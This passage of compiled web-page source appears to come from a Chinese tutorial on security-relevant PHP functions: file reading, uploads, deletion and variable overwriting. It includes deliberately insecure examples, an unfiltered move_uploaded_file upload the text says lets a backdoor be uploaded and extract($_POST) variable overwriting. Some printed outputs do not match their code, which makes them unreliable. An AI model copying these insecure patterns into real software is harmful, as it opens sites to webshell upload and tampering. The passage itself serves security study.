\u5e76\u9644\u5e26\u9519\u8bef\u4fe1\u606f\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"readfile(filename,include_path,context)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-20",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"filename\uff1a\u5fc5\u9700\u3002\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"include_path\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u8981\u641c\u7d22\u7684\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.li,{children:"context\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u6587\u4ef6\u53e5\u67c4\u73af\u5883\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\techo "<br>" . readfile("demo.txt");\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nI am a demo:) I am a demo:(\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u770b\u5230\u4e0d\u4ec5\u8f93\u51fa\u4e86\u6240\u6709\u5185\u5bb9\uff0c\u800c\u4e14\u8fd8\u8f93\u51fa\u4e86\u603b\u5171\u957f\u5ea6\u3002\u4f46\u662f\u6ca1\u6709\u8f93\u51fa\u6362\u884c\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"file",children:"file()"}),"\n",(0,r.jsx)(n.p,{children:"\u628a\u6587\u4ef6\u8bfb\u5165\u5230\u4e00\u4e2a\u6570\u7ec4\u4e2d\uff0c\u6570\u7ec4\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u5bf9\u5e94\u7684\u662f\u6587\u4ef6\u4e2d\u7684\u4e00\u884c\uff0c\u5305\u62ec\u6362\u884c\u7b26\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"file(path,include_path,context)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-21",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"path\uff1a\u5fc5\u9700\u3002\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"include_path\uff1a\u53ef\u9009\u3002\u53ef\u6307\u5b9a\u641c\u7d22\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.li,{children:"context\uff1a\u53ef\u9009\u3002\u8bbe\u7f6e\u53e5\u67c4\u73af\u5883\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\nprint_r(file("demo.txt"));\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nArray \n( \n[0] => I am the first line! \n[1] => I am the second line! \n)\n'})}),"\n",(0,r.jsx)(n.h4,{id:"parse_ini_file",children:"parse_ini_file()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u540d\u79f0\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u662f\u8bfb\u53d6\u4e00\u4e2a\u7b80\u5355\u7684\u6587\u4ef6\u3002\u5b83\u7684\u529f\u80fd\u662f\u89e3\u6790\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6(ini\u6587\u4ef6)\uff0c\u5e76\u4ee5\u6570\u7ec4\u7684\u5f62\u5f0f\u8fd4\u56de\u5176\u4e2d\u7684\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"parse_ini_file(file,process_sections)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-22",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"file\uff1a\u5fc5\u9700\u3002\u8981\u8bfb\u53d6\u7684ini\u6587\u4ef6"}),"\n",(0,r.jsx)(n.li,{children:"process_sections\uff1a\u53ef\u9009\u3002\u82e5\u4e3aTRUE\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4\uff0c\u5305\u62ec\u4e86\u8be6\u7ec6\u4fe1\u606f"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\tprint_r(parse_ini_file("demo.ini"));\n?>\n\ndemo.ini\u5185\u5bb9\uff1a\n[names]\nme = Robert\nyou = Peter\n\n[urls]\nfirst = "http://www.example.com"\nsecond = "https://www.runoob.com"\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nArray \n( \n[me] => Robert \n[you] => Peter \n[first] => http://www.example1.com \n[second] => https://www.example2.com \n)\n'})}),"\n",(0,r.jsx)(n.h4,{id:"show_sourcehighlight_file",children:"show_source()/highlight_file()"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e24\u4e2a\u51fd\u6570\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u60f3\u5fc5\u5927\u5bb6\u4e5f\u7ecf\u5e38\u89c1\u5230\u8fd9\u4e24\u4e2a\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u5c31\u662f\u8ba9php\u4ee3\u7801\u663e\u793a\u5728\u9875\u9762\u4e0a\u3002\u8fd9\u4e24\u4e2a\u6ca1\u6709\u4efb\u4f55\u533a\u522b\uff0c",(0,r.jsx)(n.code,{children:"show_source"}),"\u5176\u5b9e\u5c31\u662f",(0,r.jsx)(n.code,{children:"highlight_file"}),"\u7684\u522b\u540d\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"\u603b\u7ed3-2",children:"\u603b\u7ed3"}),"\n",(0,r.jsx)(n.p,{children:"\u6587\u4ef6\u8bfb\u53d6\u8fd9\u5757\u5185\u5bb9\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u4e0d\u96be\uff0c\u5927\u591a\u53ea\u662f\u57fa\u672c\u7684\u5e94\u7528\u3002\u91cd\u70b9\u6587\u4ef6\u8bfb\u53d6\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u6743\u9650\u548c\u8fc7\u6ee4\u53c2\u6570\uff0c\u90a3\u5c31\u95ee\u9898\u5927\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u4e86\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u8865\u5145\uff1a\u4ec0\u4e48\u662f\u53e5\u67c4\uff1f"}),"\n",(0,r.jsx)(n.p,{children:"\u5f00\u5c40\u5148\u7ed9\u4e00\u6bb5\u4ee3\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'$file = fopen("demo.txt","rb");\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u6bb5\u4ee3\u7801\u4e2d",(0,r.jsx)(n.code,{children:"$file"}),"\u5c31\u662f\u4e00\u4e2a\u53e5\u67c4\u3002\u53e5\u67c4\u5173\u952e\u70b9\u5728\u201c\u67c4\u201d\uff0c\u540e\u9762\u7684",(0,r.jsx)(n.code,{children:"fopen"}),"\u662f\u4e00\u4e2a\u8d44\u6e90\uff0c\u597d\u6bd4\u4e00\u53e3\u9505\uff0c\u800c\u524d\u9762\u7684",(0,r.jsx)(n.code,{children:"$file"}),"\u5c31\u597d\u6bd4\u8fd9\u4e2a\u9505\u7684\u628a\u624b\u3002\u90a3\u4e48\u4ee5\u540e\u6211\u4eec\u5728\u64cd\u4f5c\u7684\u65f6\u5019\u64cd\u4f5c\u628a\u624b\u5c31\u884c\u4e86\u3002\u901a\u8fc7\u8fd9\u4e2a\u628a\u624b\u6211\u4eec\u53ef\u4ee5\u95f4\u63a5\u64cd\u4f5c\u6bd4\u8f83\u5927\u7684\u8d44\u6e90\u3002\u5176\u5b9e\u4e5f\u7c7b\u4f3cC\u8bed\u8a00\u4e2d\u7684\u6307\u9488\uff0c\u53ea\u662f\u4e00\u4e2a\u6807\u8bc6\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"\u6587\u4ef6\u4e0a\u4f20",children:"\u6587\u4ef6\u4e0a\u4f20"}),"\n",(0,r.jsx)(n.h4,{id:"move_uploaded_file",children:"move_uploaded_file()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u662f\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"move_uploaded_file(file,newloc)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-23",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"file\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u79fb\u52a8\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"newloc\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u6587\u4ef6\u7684\u65b0\u4f4d\u7f6e\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u672c\u51fd\u6570\u68c0\u67e5\u5e76\u786e\u4fdd\u7531 file \u6307\u5b9a\u7684\u6587\u4ef6\u662f\u5408\u6cd5\u7684\u4e0a\u4f20\u6587\u4ef6\uff08\u5373\u901a\u8fc7 PHP \u7684 HTTP POST \u4e0a\u4f20\u673a\u5236\u6240\u4e0a\u4f20\u7684\uff09\u3002\u5982\u679c\u6587\u4ef6\u5408\u6cd5\uff0c\u5219\u5c06\u5176\u79fb\u52a8\u4e3a\u7531 newloc \u6307\u5b9a\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c file \u4e0d\u662f\u5408\u6cd5\u7684\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u64cd\u4f5c\uff0cmove_uploaded_file() \u5c06\u8fd4\u56de false\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c file \u662f\u5408\u6cd5\u7684\u4e0a\u4f20\u6587\u4ef6\uff0c\u4f46\u51fa\u4e8e\u67d0\u4e9b\u539f\u56e0\u65e0\u6cd5\u79fb\u52a8\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u64cd\u4f5c\uff0cmove_uploaded_file() \u5c06\u8fd4\u56de false\uff0c\u6b64\u5916\u8fd8\u4f1a\u53d1\u51fa\u4e00\u6761\u8b66\u544a\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"$fileName = $_SERVER['DOCUMENT_ROOT'].'/uploads/'.$_FILES['file']['name'];\nmove_uploaded_file($_FILES['file']['tmp_name'],$fileName )\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u6bb5\u4ee3\u7801\u5c31\u662f\u76f4\u63a5\u63a5\u6536\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u7684\u8fc7\u6ee4\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u4e0a\u4f20getshell\u7684\u540e\u95e8\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u6743\u9650\uff0c\u53ef\u89c1\u8fd9\u4e2a\u51fd\u6570\u662f\u4e0d\u80fd\u4e71\u7528\u7684\uff0c\u5373\u4fbf\u8981\u7528\u4e5f\u8981\u5c06\u8fc7\u6ee4\u89c4\u5219\u5b8c\u5584\u597d\uff0c\u9632\u6b62\u4e0a\u4f20\u4e0d\u5408\u6cd5\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u6587\u4ef6\u5220\u9664",children:"\u6587\u4ef6\u5220\u9664"}),"\n",(0,r.jsx)(n.h4,{id:"unlink",children:"unlink()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u7528\u6765\u5220\u9664\u6587\u4ef6\u3002\u6210\u529f\u8fd4\u56de TURE \uff0c\u5931\u8d25\u8fd4\u56de FALSE\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"unlink(filename,context)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-24",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"filename\uff1a\u5fc5\u9700\u3002\u8981\u5220\u9664\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"context\uff1a\u53ef\u9009\u3002\u53e5\u67c4\u73af\u5883\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u77e5\u9053\uff0c\u4e00\u4e9b\u7f51\u7ad9\u662f\u6709\u5220\u9664\u529f\u80fd\u7684\u3002\u6bd4\u5982\u5e38\u89c1\u7684\u8bba\u575b\u7f51\u7ad9\uff0c\u662f\u6709\u5220\u9664\u8bc4\u8bba\u6216\u8005\u6587\u7ae0\u529f\u80fd\u7684\u3002\u5018\u82e5\u7f51\u7ad9\u6ca1\u6709\u5bf9\u5220\u9664\u5904\u505a\u9650\u5236\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u5220\u9664\uff08\u751a\u81f3\u5220\u9664\u7f51\u7ad9\u6e90\u7801\uff09\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    $file = "demo.txt";\n    if(unlink($file)){\n        echo("$file have been deleted");\n    }\n\telse{\n        echo("$file not exist?")\n    }\nphp>\n'})}),"\n",(0,r.jsx)(n.h4,{id:"session_destroy",children:"session_destroy()"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u4e86\u89e3\u8fd9\u4e2a\u51fd\u6570\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5148\u4e86\u89e3 PHP session\u3002 PHP session \u53d8\u91cf\u7528\u4e8e\u5b58\u50a8\u5173\u4e8e\u7528\u6237\u4f1a\u8bdd\u7684\u4fe1\u606f\u3002\u5173\u4e8e sesson \u7684\u673a\u5236\u8fd9\u91cc\u6211\u5c31\u4e0d\u518d\u8fc7\u4e8e\u8be6\u7ec6\u4ecb\u7ecd\u3002"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"session_destroy()"}),"\u51fd\u6570\u7528\u6765\u9500\u6bc1\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u7684\u5168\u90e8\u6570\u636e\uff0c\u4f46\u5e76\u4e0d\u4f1a\u91cd\u7f6e\u5f53\u524d\u4f1a\u8bdd\u6240\u5173\u8054\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u540c\u65f6\u4e5f\u4e0d\u4f1a\u91cd\u7f6e\u4f1a\u8bdd cookie"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n// \u521d\u59cb\u5316\u4f1a\u8bdd\u3002\n// \u5982\u679c\u8981\u4f7f\u7528\u4f1a\u8bdd\uff0c\u522b\u5fd8\u4e86\u73b0\u5728\u5c31\u8c03\u7528\uff1a\nsession_start();\n\n// \u91cd\u7f6e\u4f1a\u8bdd\u4e2d\u7684\u6240\u6709\u53d8\u91cf\n$_SESSION = array();\n\n// \u5982\u679c\u8981\u6e05\u7406\u7684\u66f4\u5f7b\u5e95\uff0c\u90a3\u4e48\u540c\u65f6\u5220\u9664\u4f1a\u8bdd cookie\n// \u6ce8\u610f\uff1a\u8fd9\u6837\u4e0d\u4f46\u9500\u6bc1\u4e86\u4f1a\u8bdd\u4e2d\u7684\u6570\u636e\uff0c\u8fd8\u540c\u65f6\u9500\u6bc1\u4e86\u4f1a\u8bdd\u672c\u8eab\nif (ini_get("session.use_cookies")) {\n    $params = session_get_cookie_params();\n    setcookie(session_name(), \'\', time() - 42000,\n        $params["path"], $params["domain"],\n        $params["secure"], $params["httponly"]\n    );\n}\n\n// \u6700\u540e\uff0c\u9500\u6bc1\u4f1a\u8bdd\nsession_destroy();\n?> \n'})}),"\n",(0,r.jsx)(n.h3,{id:"\u53d8\u91cf\u8986\u76d6",children:"\u53d8\u91cf\u8986\u76d6"}),"\n",(0,r.jsx)(n.h4,{id:"extract",children:"extract()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u4ece\u6570\u7ec4\u4e2d\u5c06\u53d8\u91cf\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\u3002\u5176\u5b9e\u4f5c\u7528\u5c31\u662f\u7ed9\u53d8\u91cf\u91cd\u65b0\u8d4b\u503c\uff0c\u4ece\u800c\u8fbe\u5230\u53d8\u91cf\u8986\u76d6\u7684\u4f5c\u7528\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"extract(array,extract_rules,prefix)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-25",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"array\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u4f7f\u7528\u7684\u6570\u7ec4\u3002"}),"\n",(0,r.jsxs)(n.li,{children:["extract_rules\uff1a\u53ef\u9009\u3002extract\u51fd\u6570\u5c06\u68c0\u67e5\u6bcf\u4e2a\u952e\u540d\u662f\u5426\u4e3a\u5408\u6cd5\u7684\u53d8\u91cf\u540d\uff0c\u540c\u65f6\u4e5f\u68c0\u67e5\u548c\u7b26\u53f7\u4e2d\u5df2\u7ecf\u5b58\u5728\u7684\u53d8\u91cf\u540d\u662f\u5426\u51b2\u7a81\uff0c\u5bf9\u4e0d\u5408\u6cd5\u6216\u8005\u51b2\u7a81\u7684\u952e\u540d\u5c06\u4f1a\u6839\u636e\u6b64\u53c2\u6570\u7684\u8bbe\u5b9a\u7684\u89c4\u5219\u6765\u51b3\u5b9a\u3002","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"EXTR_OVERWRITE - \u9ed8\u8ba4\u3002\u5982\u679c\u6709\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u5df2\u6709\u7684\u53d8\u91cf\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_SKIP - \u5982\u679c\u6709\u51b2\u7a81\uff0c\u4e0d\u8986\u76d6\u5df2\u6709\u7684\u53d8\u91cf\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_PREFIX_SAME - \u5982\u679c\u6709\u51b2\u7a81\uff0c\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u524d\u7f00 prefix\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_PREFIX_ALL - \u7ed9\u6240\u6709\u53d8\u91cf\u540d\u52a0\u4e0a\u524d\u7f00 prefix\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_PREFIX_INVALID - \u4ec5\u5728\u4e0d\u5408\u6cd5\u6216\u6570\u5b57\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u524d\u7f00 prefix\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_IF_EXISTS - \u4ec5\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u5df2\u6709\u540c\u540d\u53d8\u91cf\u65f6\uff0c\u8986\u76d6\u5b83\u4eec\u7684\u503c\u3002\u5176\u5b83\u7684\u90fd\u4e0d\u5904\u7406\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_PREFIX_IF_EXISTS - \u4ec5\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u5df2\u6709\u540c\u540d\u53d8\u91cf\u65f6\uff0c\u5efa\u7acb\u9644\u52a0\u4e86\u524d\u7f00\u7684\u53d8\u91cf\u540d\uff0c\u5176\u5b83\u7684\u90fd\u4e0d\u5904\u7406\u3002"}),"\n",(0,r.jsx)(n.li,{children:"EXTR_REFS - \u5c06\u53d8\u91cf\u4f5c\u4e3a\u5f15\u7528\u63d0\u53d6\u3002\u5bfc\u5165\u7684\u53d8\u91cf\u4ecd\u7136\u5f15\u7528\u4e86\u6570\u7ec4\u53c2\u6570\u7684\u503c\u3002"}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.li,{children:"prefix\uff1a\u53ef\u9009\u3002\u5982\u679c extract_rules \u53c2\u6570\u7684\u503c\u662f EXTR_PREFIX_SAME\u3001EXTR_PREFIX_ALL\u3001 EXTR_PREFIX_INVALID \u6216 EXTR_PREFIX_IF_EXISTS\uff0c\u5219 prefix \u662f\u5fc5\u9700\u7684\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    $color = "blue";\n    $one_array = array("color" => "red",\n        "size"  => "medium",\n        "name" => "dog");\n    extract($one_array);\n    echo "$color, $size, $name";\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nred, medium, dog\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u770b\u5230\uff0c\u672c\u6765\u6211\u4eec\u5b9a\u4e49\u7684color\u662fblue\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u53d8\u6210\u4e86red\uff0c\u672c\u6765\u6211\u4eec\u6ca1\u6709\u5b9a\u4e49size\u548cname\uff0c\u53ef\u662f\u5374\u80fd\u8f93\u51fa\u8fd9\u4e24\u4e2a\u53d8\u91cf\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd8\u6709\u4e00\u4e9b\u5728CTF\u6bd4\u8d5b\u4e2d\u51fa\u73b0\u8fc7\u7684\u7528\u6cd5\uff0c\u6bd4\u5982\u76f4\u63a5\u8ba9\u4f60POST\u4f20\u53c2\u6765\u6539\u53d8\u67d0\u4e2a\u53d8\u91cf\u7684\u503c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $name = 'cat';\n    extract($_POST);\n    echo $name;\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53c2\u65f6\u5982\u679c\u6211\u4eecPOST\u4f20\u5165name=dog\uff0c\u90a3\u4e48\u9875\u9762\u5c06\u4f1a\u56de\u663edog\uff0c\u8bf4\u660e\u8fd9\u4e2a\u51fd\u6570\u7684\u4f7f\u7528\u8ba9\u6211\u4eec\u5b9e\u73b0\u4e86\u53d8\u91cf\u7684\u8986\u76d6\uff0c\u6539\u53d8\u4e86\u53d8\u91cf\u7684\u503c\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"parse_str",children:"parse_str()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u628a\u67e5\u8be2\u5230\u7684\u5b57\u7b26\u4e32\u89e3\u6790\u5230\u53d8\u91cf\u4e2d\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"parse_str(string,array)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-26",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"string\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u89e3\u6790\u7684\u5b57\u7b26\u4e32\u3002"}),"\n",(0,r.jsx)(n.li,{children:"array\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u5b58\u50a8\u53d8\u91cf\u7684\u6570\u7ec4\u540d\u79f0\u3002\u8be5\u53c2\u6570\u53ea\u662f\u53d8\u91cf\u5b58\u50a8\u5230\u6570\u7ec4\u4e2d\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    parse_str("name=Ameng&sex=boy",$a);\n    print_r($a);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nArray\n(\n    [name] => Ameng\n    [sex] => boy\n)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0a\u8ff0\u4ee3\u7801\u662f\u6709array\u60c5\u51b5\u4e0b\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u90a3\u4e48\u5982\u4f55\u5b9e\u73b0\u53d8\u91cf\u7684\u8986\u76d6\u5462\uff1f\u5982\u679c\u6ca1\u6709array \u53c2\u6570\uff0c\u5219\u7531\u8be5\u51fd\u6570\u8bbe\u7f6e\u7684\u53d8\u91cf\u5c06\u8986\u76d6\u5df2\u5b58\u5728\u7684\u540c\u540d\u53d8\u91cf\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$name = 'who';\n    $age = '20';\n    parse_str(\"name=Ameng&age=21\");\n    echo \"$name, $age\";\n?>\n\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nAmeng, \n"})}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u4e0a\u8ff0\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u53d8\u91cfname\u548cage\u90fd\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u88ab\u65b0\u7684\u503c\u8986\u76d6\u4e86\u3002\u8fd9\u91cc\u6211\u7528\u7684\u662f PHP 7.4.3 \u7248\u672c\u3002\u53d1\u73b0\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd9\u4e2a\u4f5c\u7528\u8fd8\u662f\u5b58\u5728\u7684\uff0c\u4e14\u6ca1\u6709\u4efb\u4f55\u5371\u9669\u63d0\u793a\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"import_request_variables",children:"import_request_variables()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u5c06GET/POST/Cookie\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u3002\u4ece\u800c\u80fd\u591f\u8fbe\u5230\u53d8\u91cf\u8986\u76d6\u7684\u4f5c\u7528\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u7248\u672c\u8981\u6c42\uff1aPHP 4 >= 4.1.0, PHP 5 < 5.4."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"bool import_request_variables ( string $types [, string $prefix ] )\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-27",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"types\uff1a\u6307\u5b9a\u9700\u8981\u5bfc\u5165\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u7528\u5b57\u6bcd G\u3001P \u548c C \u5206\u522b\u8868\u793a GET\u3001POST \u548c Cookie\uff0c\u8fd9\u4e9b\u5b57\u6bcd\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u4f7f\u7528 g \u3001 p \u548c c \u7684\u4efb\u4f55\u7ec4\u5408\u3002POST \u5305\u542b\u4e86\u901a\u8fc7 POST \u65b9\u6cd5\u4e0a\u4f20\u7684\u6587\u4ef6\u4fe1\u606f\u3002\u6ce8\u610f\u8fd9\u4e9b\u5b57\u6bcd\u7684\u987a\u5e8f\uff0c\u5f53\u4f7f\u7528 gp \u65f6\uff0cPOST \u53d8\u91cf\u5c06\u4f7f\u7528\u76f8\u540c\u7684\u540d\u5b57\u8986\u76d6 GET \u53d8\u91cf\u3002"}),"\n",(0,r.jsx)(n.li,{children:"prefix\uff1a\u53d8\u91cf\u540d\u7684\u524d\u7f00\uff0c\u7f6e\u4e8e\u6240\u6709\u88ab\u5bfc\u5165\u5230\u5168\u5c40\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u4e4b\u524d\u3002\u6240\u4ee5\u5982\u679c\u4f60\u6709\u4e2a\u540d\u4e3a userid \u7684 GET \u53d8\u91cf\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86 pref_ \u4f5c\u4e3a\u524d\u7f00\uff0c\u90a3\u4e48\u4f60\u5c06\u83b7\u5f97\u4e00\u4e2a\u540d\u4e3a $pref_userid \u7684\u5168\u5c40\u53d8\u91cf\u3002\u867d\u7136 prefix 